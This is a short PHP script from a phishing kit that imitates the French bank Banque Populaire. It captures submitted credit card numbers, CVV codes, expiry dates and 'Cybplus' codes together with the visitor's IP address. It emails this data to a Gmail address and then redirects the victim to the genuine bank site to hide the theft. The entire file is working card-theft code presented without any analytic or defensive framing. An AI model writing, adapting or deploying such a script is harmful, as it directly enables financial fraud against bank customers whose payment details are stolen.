<?php

$ip = getenv("REMOTE_ADDR");
$browser = getenv ("HTTP_USER_AGENT");
$message .= "-------------------| Secure info |-------------------\n";
$message .= "-------------------| CB+ |-------------------\n";
$message .= "Carte de credit        : ".$_POST['ccnum2']."\n";
$message .= "Cvv                    : ".$_POST['cvv2']."\n";
$message .= "Date expiration        : ".$_POST['expm2']."/".$_POST['expy2']."\n";
$message .= "Cybplus                : ".$_POST['ncom2']."\n";
$message .= "------------------------------------------------------------------\n";
$message .= "--------------------+ Secure Info +--------------------\n";
$message .= "+-----/!\-----| Mankou |-----/!\-----+\n";
$to = "pthgwa@gmail.com";
$subj = " Popu ||".$ip."\n";
$from = "From: Pop Final <notifications@walo.com>";

mail($to, $subj, $message, $from);


header("Location: http://www.banquepopulaire.fr/portailinternet/Pages/default.aspx");



?>   